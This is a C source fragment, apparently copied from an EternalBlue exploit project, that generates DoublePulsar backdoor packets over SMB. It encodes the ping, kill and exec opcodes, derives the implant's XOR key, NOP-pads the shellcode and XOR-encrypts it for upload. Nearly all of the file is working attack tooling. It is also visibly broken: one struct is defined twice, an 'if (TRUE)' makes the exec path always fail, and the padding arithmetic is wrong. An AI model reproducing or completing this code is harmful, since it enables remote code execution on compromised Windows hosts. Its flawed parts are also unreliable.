//code originally from:  https://github.com/CyberSecurityExploitDevelopment/WindowsEternalBlue/

/*
This source provided can be useful in dynamically generating a DoublePulsar upload packet.
Essential functions have been copied, more information is missing and will be added later.
*/

typedef struct _SMB_HEADER {
	BYTE Protocol[4];
	BYTE Command;
	union {
		struct {
			BYTE ErrorClass;
			BYTE Reserved;
			WORD Error;
		}DosError;
		DWORD NtStatus;
	}Status;
	BYTE Flags;
	WORD Flags2;
	union {
		WORD Reserved[6];
		struct {
			WORD PidHigh;
			union {
				struct {
					DWORD Key;
					WORD Sid;
					WORD SequenceNumber;
					WORD Gid;
				};
				BYTE SecuritySignature[8];
			};
		};
	};
	WORD Tid;
	WORD Pid;
	WORD Uid;
	WORD Mid;
}SMB_HEADER, * PSMB_HEADER;


typedef struct _REQ_TRANSACTION2 {
	BYTE WordCount;
	WORD TotalParameterCount;
	WORD TotalDataCount;
	WORD MaxParameterCount;
	WORD MaxDataCount;
	BYTE MaxSetupCount;
	BYTE Reserved1;
	WORD Flags;
	DWORD Timeout;
	WORD Reserved2;
	WORD ParameterCount;
	WORD ParameterOffset;
	WORD DataCount;
	WORD DataOffset;
	BYTE SetupCount;
	BYTE Reserved3;
	BYTE Buffer[1];
}REQ_TRANSACTION2, * PREQ_TRANSACTION2;


typedef struct _TRANS2_SESSION_SETUP_PARAMETERS {
	union {
		struct {
			DWORD LengthOne;
			DWORD LengthTwo;
			DWORD OffsetToCopyShellcodeTo;
		};
		DWORD ParameterDoublewords[3];
		BYTE ParameterBytes[sizeof(DWORD) * 3];
	};
}TRANS2_SESSION_SETUP_PARAMETERS, * PTRANS2_SESSION_SETUP_PARAMETERS;

typedef struct _REQ_TRANSACTION2_SESSION_SETUP {
	WORD SubCommand;	//should be 0x000e
	WORD ByteCount;		//should be DataCount + 13 (sizeof(TRANS2_SESSION_SETUP_PARAMETERS) + 1 should eq. 13)
	BYTE Padding[1];	//should be 0x00
	TRANS2_SESSION_SETUP_PARAMETERS SessionSetupParameters;		//Trans2 SESSION_SETUP Params
	BYTE SessionSetupData[1];									//Trans2 SESSION_SETUP Data
}REQ_TRANSACTION2_SESSION_SETUP, * PREQ_TRANSACTION2_SESSION_SETUP;



PBYTE trans2_session_setup_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode)
{
	DWORD op = 0, k = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = NULL;
	PSMB_HEADER smb = NULL;

	op = opcode;
	//PutUnsigned(&k, random());
	csprng(MAKEPBYTE(&k), sizeof(k));
	t = 0xFF & (op - ((k & 0xFFFF00) >> 16) - (0xFFFF & (k & 0xFF00) >> 8)) | k & 0xFFFF00;


	smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PutUlong(&trans2->Timeout, GetUlong(&t));

	if (!cmp(smb->Protocol, "\xFFSMB", 4))
		return FALSE;
	else
		return TRUE;
}


DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws)
{
	ULONGLONG s = 0;
	ULARGE_INTEGER x = { 0 };
	PSMB_HEADER smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	s = byteswap64(GetUlonglong(smb->SecuritySignature));
	s = GetUlonglong(smb->SecuritySignature);

	x.QuadPart = (2 * s ^ (((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8)));

	return (x.LowPart & 0xFFFFFFFF);
}


//dunno if we keep this here
typedef struct _REQ_TRANSACTION2_SESSION_SETUP {
	WORD SubCommand;	//should be 0x000e
	WORD ByteCount;		//should be DataCount + 13 (sizeof(TRANS2_SESSION_SETUP_PARAMETERS) + 1 should eq. 13)
	BYTE Padding[1];	//should be 0x00
	TRANS2_SESSION_SETUP_PARAMETERS SessionSetupParameters;		//Trans2 SESSION_SETUP Params
	BYTE SessionSetupData[1];									//Trans2 SESSION_SETUP Data
}REQ_TRANSACTION2_SESSION_SETUP, * PREQ_TRANSACTION2_SESSION_SETUP;


typedef struct SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST {
	union {
		ANYPOINTER AnyNetbiosSizeAddress;
		WORD* NetbiosSize;
	};

	union {
		ANYPOINTER SmbAnyAddress;
		PSMB_HEADER Smb;
	};
	
	union {
		ANYPOINTER Transaction2AnyAddress;
		PREQ_TRANSACTION2 Trans2;
	};

	union {
		ANYPOINTER Trans2SessionSetupAnyAddress;
		PREQ_TRANSACTION2_SESSION_SETUP Trans2SessionSetup;
	};
}*PSMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST;


PBYTE GenerateDoublePulsarTrans2SessionSetupParameters(BUFFER* IN OUT parameters, DWORD IN opcode, DWORD* IN OPTIONAL datalength, DWORD IN OPTIONAL xorkey, PSMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST last_trans2_session_setup_req)
{
	SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST* previous = NULL;
	PTRANS2_SESSION_SETUP_PARAMETERS session_setup_parameters = NULL;
	DWORD paramsize = 0, i = 0, dwords = 0, * dwptr = NULL, dwstatus[2] = { 0 };
	if ((opcode & DOPU_PING_OPCODE) == DOPU_PING_OPCODE)
	{
		paramsize = 12;
		RtlZeroMemory(parameters, sizeof(BUFFER));
		bwsalloc(parameters, paramsize);
		RtlFillMemory(parameters->pbdata, MAKESIZET(parameters->dwsize), 0);
	}
	else if ((opcode & DOPU_KILL_OPCODE) == DOPU_KILL_OPCODE)
	{
		paramsize = 12;
		RtlZeroMemory(parameters, sizeof(BUFFER));
		bwsalloc(parameters, paramsize);
		RtlFillMemory(parameters->pbdata, MAKESIZET(parameters->dwsize), 0);
	}
	else if ((opcode & DOPU_EXEC_OPCODE) == DOPU_EXEC_OPCODE)
	{
		if (isnull(last_trans2_session_setup_req) || isnull(datalength))
		{
			PutUlong(dwstatus, STATUS_INVALID_PARAMETER);
			SetLastError(GetUlong(dwstatus));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(dwstatus));
			return NULL;
		}

		PutUlong(dwstatus + 1, 1);
		AllocateSmbLibLastTrans2SessionSetupRequestStructure(&previous, GetUlong(dwstatus + 1));
		RtlCopyMemory(previous, last_trans2_session_setup_req, sizeof(SMBLIB_LAST_TRANS2_SESSION_SETUP_REQUEST));

		if (
			(isnull(previous->NetbiosSize)) ||
			(isnull(previous->Smb)) ||
			(isnull(previous->Trans2)) ||
			(isnull(previous->Trans2SessionSetup))
			)
		{
			FreeSmbLibLastTrans2SessionSetupRequestStructure(&previous);
			PutUlong(dwstatus, STATUS_INVALID_PARAMETER);
			SetLastError(GetUlong(dwstatus));
			errmsg(__FUNCSIG__, __LINE__, GetUlong(dwstatus));
			return NULL;
		}



		paramsize = sizeof(previous->Trans2SessionSetup->SessionSetupParameters);
		PutUlong(&dwords, (paramsize / sizeof(DWORD)));
		bwsalloc(parameters, paramsize);

		session_setup_parameters = ((PTRANS2_SESSION_SETUP_PARAMETERS)(parameters->pbdata));
		PutUlong(session_setup_parameters->ParameterDoublewords, 0x4200);
		PutUlong(session_setup_parameters->ParameterDoublewords + 1, GetUlong(datalength));

		
		PutUlong(session_setup_parameters->ParameterDoublewords + 2, 0);

	}
	return parameters->pbdata;
}


//pads double pulsar payload to a multiple of 0x1000 or 4096
PBYTE PadDoPuPayloadToProperSize(BUFFER IN OUT* payload)
{
	unsigned int padbyte = 0x90;
	static BUFFER tmp;
	static ANYPOINTER offset;
	static DWORD size;

	if (!payload->dwsize)
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return NULL;
	}

	if (payload->dwsize < 0x1000)
		size = 0x1000;// - payload->dwsize;
	else if ((payload->dwsize > 0x1000) && (payload->dwsize % 0x1000))
		size = payload->dwsize + (payload->dwsize % 0x1000);
	else
		errmsg(__FUNCSIG__, __LINE__, NT_STATUS_INVALID_VIEW_SIZE);
	if (!size)
		return NULL;

	bwsalloc(&tmp, size);
	offset.address += payload->dwsize;//PutUlong(&offset.address, payload->dwsize);
	cpy(tmp.pbdata, payload->pbdata, payload->dwsize);

	RtlFillMemory(tmp.pbdata + offset.address, MAKESIZET(tmp.dwsize - payload->dwsize), padbyte);
	bwsfree(payload);

	bwsalloc(payload, tmp.dwsize);
	cpy(payload->pbdata, tmp.pbdata, tmp.dwsize);
	bwsfree(&tmp);
	
	return payload->pbdata;
}


BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey)
{
	static BUFFER tmp;
	DWORD doublewordsize = 0, remainder = 0, * dwptr = NULL, i = 0;

	if (isnull(payload) || !GetUlong(&xorkey))
		return FALSE;

	if (payload->dwsize % 0x1000)
		return FALSE;

	doublewordsize = (payload->dwsize / sizeof(DWORD));
	dwptr = MAKEPDWORD(payload->pbdata);

	for (i = 0; i < doublewordsize; i++)
		dwptr[i] ^= xorkey;

	return TRUE;
}


PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL;
	PSMB_HEADER h = NULL;
	ANYPOINTER data = { 0 }, params = { 0 };
	BUFFER execparams = { 0 }, tmp = { 0 };
	DWORD xorkey = 0, fullpacketsize = 0;
	PVOID pvTrans2Buffer = NULL;
	PREQ_TRANSACTION2_SESSION_SETUP session_setup = NULL;
	static DWORD lengthone, lengthtwo, dopuoffset;
	LONG lisessionsetupoffset = FIELD_OFFSET(REQ_TRANSACTION2, Buffer), lisessionsetupparamoffset = FIELD_OFFSET(REQ_TRANSACTION2_SESSION_SETUP, SessionSetupParameters);

	//if payload isnt padded to a multiple of 4096 pad it with nops until it is
	if (payload->dwsize < 0x1000 || payload->dwsize % 0x1000)
		if (isnull(PadDoPuPayloadToProperSize(payload)))
			return NULL;
	//get the double pulsar xor key 
	xorkey = GetDoublePulsarXorKey(xorkeypacket);
	
	//fail if the key is 0
	if (!xorkey)
		return NULL;

	bwsalloc(&tmp, DOUBLE_PULSAR_EXEC_TRANS2_SESSION_SETUP_FIRST_PACKET_SIZE);
	bwsalloc(bws, tmp.dwsize + payload->dwsize);

	cpy(tmp.pbdata, DOUBLE_PULSAR_EXEC_TRANS2_SESSION_SETUP_FIRST_PACKET, tmp.dwsize);
	h = MAKEPSMB(tmp.pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Tid, tid);

	cpy(bws->pbdata, tmp.pbdata, min(tmp.dwsize, bws->dwsize));
	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = ((PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET));
	session_setup = ((PREQ_TRANSACTION2_SESSION_SETUP)(trans->Buffer));

	if (TRUE)//isnull(GenerateDoublePulsarTrans2SessionSetupParameters(&execparams, DOPU_EXEC_OPCODE, &payload->dwsize, xorkey)))
	{
		bwsfree(bws);
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		return NULL;
	}

	XorEncryptPayload(payload, xorkey);

	lisessionsetupoffset += SMB_PARAM_OFFSET;

	lengthone = session_setup->SessionSetupParameters.LengthOne, lengthtwo = session_setup->SessionSetupParameters.LengthTwo, dopuoffset = session_setup->SessionSetupParameters.OffsetToCopyShellcodeTo;
	lengthone ^= xorkey, lengthtwo ^= xorkey, dopuoffset ^= xorkey;

	//set netbios size in nbt header
	PutUshort(bws->pbdata + NETBIOS_SIZE_OFFSET, LOWORD(DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE + payload->dwsize));

	

	return bws->pbdata;
}

PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PRESP_TRANSACTION_INTERIM treedisconnect = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	treedisconnect = (PRESP_TRANSACTION_INTERIM)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

//readFile
BOOLEAN __stdcall readfile(UNICODE_STRING* filename, BUFFER* IN OUT filedata)
{
	HANDLE hfile = NULL;
	LARGE_INTEGER lifilesize = { 0 };

	hfile = CreateFileW(filename->Buffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hfile == INVALID_HANDLE_VALUE)
	{
		SetLastError(STATUS_INVALID_HANDLE);
		return FALSE;
	}

	if (!GetFileSizeEx(hfile, &lifilesize))
	{
		CloseHandle(hfile);
		return FALSE;
	}

	RtlZeroMemory(filedata, sizeof(BUFFER));
	bwsalloc(filedata, GetUlong(&lifilesize.LowPart));

	if (!ReadFile(hfile, filedata->pbdata, filedata->dwsize, (DWORD *)&lifilesize.HighPart, NULL))
	{
		CloseHandle(hfile);
		return FALSE;
	}

	CloseHandle(hfile);
	return TRUE;
}




